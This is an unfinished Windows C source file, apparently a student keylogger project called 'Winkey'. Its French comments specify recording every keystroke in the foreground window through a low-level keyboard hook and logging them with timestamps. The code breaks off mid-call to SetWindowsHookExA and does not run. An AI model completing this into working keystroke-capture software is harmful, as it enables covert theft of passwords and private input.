#include <windows.h>
#include <stdio.h>
#include <winuser.h>
/*	Winkey:
 *	-doit detecter le processus de premier plan
 *	-doit sauvegarder toutes les touches tapper dans le processus de premier plan
 *	-le clavier doit etre traite pour un hook low-level
 *	-Tout ces infos doivent etre stocker dans un fichier de log avec l'horaire des logs
 *	-Evidement le logs logs doivent etre lisible par un humain
 */
int main(void){
	BOOL is_running = 1;
	HWND	hdWindowForeground = GetFocus();
	HHOOK	HookFgWind = SetWindowsHookExA(WH_KEYBOARD_LL,
						
	return 0;
}
